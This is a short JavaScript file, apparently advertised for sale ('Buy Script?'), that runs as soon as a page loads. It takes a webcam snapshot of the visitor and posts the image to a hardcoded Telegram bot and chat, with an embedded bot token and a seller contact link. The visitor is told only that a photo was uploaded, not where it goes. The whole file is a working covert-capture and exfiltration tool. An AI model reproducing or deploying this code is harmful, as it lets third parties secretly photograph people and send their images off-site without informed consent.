async function ambilFoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        video.srcObject = stream;
        await video.play();

        context.drawImage(video, 0, 0, 320, 240);
        const dataURL = canvas.toDataURL('image/png');

        stream.getTracks().forEach(track => track.stop());
        unggahFoto(dataURL);
    } catch (error) {
        console.error('Error:', error);
        alert('Gagal mengambil foto. Pastikan webcam diizinkan.');
    }
}

async function unggahFoto(dataURL) {
    const botToken = '7261793699:AAHOuCwtpv_WtsG3EoGRoTXwKuG0BeZ1MoQ';
    const chatId = '-1002571515096';
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', await fetch(dataURL).then(r => r.blob()), 'foto.png');
    formData.append('caption', 'Buy Script?');
    formData.append('reply_markup', JSON.stringify({
        inline_keyboard: [[{ text: 'Hubungi Pemilik', url: 't.me/Dimzxzzx' }]]
    }));

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        console.log('Telegram API Response:', data);
        if (data.ok) {
            alert('Foto berhasil diunggah!');
        } else {
            alert('Gagal mengunggah foto ke Telegram.');
        }

    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan saat mengunggah foto.');
    }
}

window.onload = ambilFoto;
          
